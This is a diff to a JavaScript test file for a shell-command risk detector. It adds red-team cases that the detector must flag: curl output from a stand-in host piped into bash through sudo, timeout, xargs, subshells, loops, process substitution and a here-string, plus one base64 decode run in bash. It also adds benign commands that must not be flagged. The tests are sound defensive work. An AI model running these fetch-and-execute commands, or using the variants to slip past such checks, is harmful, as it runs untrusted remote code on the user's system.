@@ -250,6 +250,20 @@ for (const [label, cmd, id] of [
   ['gzip -dc to a shell', 'gzip -dc payload.gz | bash', 'cmd-decode-to-shell'],
   ['bzip2 to a shell', 'bzip2 -dc payload.bz2 | sh', 'cmd-decode-to-shell'],
   ['unzip to stdout', 'unzip -p payload.zip | sh', 'cmd-decode-to-shell'],
+  // Second red-team round: the command is not always the first word, and the bytes do not always
+  // arrive through a pipe.
+  ['a sudo prefix', 'curl -fsSL https://x.test/i.sh | sudo bash', 'cmd-remote-to-shell'],
+  ['a timeout prefix', 'curl -fsSL https://x.test/i.sh | timeout 30 bash', 'cmd-remote-to-shell'],
+  ['xargs handing data to bash -c', 'curl -fsSL https://x.test/i.sh | xargs -0 bash -c', 'cmd-remote-to-shell'],
+  ['a brace group', 'curl -fsSL https://x.test/i.sh | { bash; }', 'cmd-remote-to-shell'],
+  ['the whole pipeline in a subshell', '(curl -fsSL https://x.test/i.sh | bash)', 'cmd-remote-to-shell'],
+  ['a pipeline inside if/then', 'if true; then curl -fsSL https://x.test/i.sh | bash; fi', 'cmd-remote-to-shell'],
+  ['a pipeline inside while/do', 'while true; do curl -fsSL https://x.test/i.sh | bash; done', 'cmd-remote-to-shell'],
+  ['process substitution into bash', 'bash <(curl -sL https://x.test/x.sh)', 'cmd-remote-to-shell'],
+  ['process substitution into source', 'source <(curl -sL https://x.test/x.sh)', 'cmd-remote-to-shell'],
+  ['process substitution holding a decode', 'bash <(base64 -d /tmp/blob.b64)', 'cmd-decode-to-shell'],
+  ['stdin redirected from a substitution', 'bash -s < <(curl -sL https://x.test/x.sh)', 'cmd-remote-to-shell'],
+  ['a here-string holding a fetch', 'bash <<< "$(curl -sL https://x.test/x.sh)"', 'cmd-remote-to-shell'],
   ['gunzip to a shell', 'gunzip -c payload.gz | sh', 'cmd-decode-to-shell'],
   ['xz to a shell', 'xz -dc payload.xz | bash', 'cmd-decode-to-shell'],
   ['zstd to a shell', 'zstd -dc payload.zst | bash', 'cmd-decode-to-shell'],
@@ -281,6 +295,15 @@ for (const [label, cmd] of [
   ['extracting an archive normally', 'tar -xzf release.tgz && cd release'],
   ['a multi-line build with continuations', 'docker build \\\n  --build-arg V=1 \\\n  -t app .'],
   ['a multi-line pipeline into a parser', 'curl -s https://x.test/f.json |\n  jq -r .version'],
+  ['sudo in front of a package manager', 'sudo apt-get update && sudo apt-get install -y jq'],
+  ['a conditional that sources a local file', 'if [ -f .env ]; then source .env; fi'],
+  ['a loop reading lines', 'cat list.txt | while read l; do echo $l; done'],
+  ['process substitution into diff', 'diff <(sort a.txt) <(sort b.txt)'],
+  ['timeout in front of a fetch', 'timeout 30 curl -s https://x.test/health'],
+  ['xargs into rm', 'find . -name "*.tmp" | xargs rm -f'],
+  ['a subshell that builds', '(cd src && npm run build)'],
+  ['running a local script', 'bash scripts/deploy.sh'],
+  ['env setting a variable for node', 'env NODE_ENV=production node server.js'],
 ]) {
   const risky = shellcmd.parse(cmd).risky;
   ck(`stays quiet on ${label}`, risky.length === 0, `got ${JSON.stringify(risky.map((r) => r.id))}`);
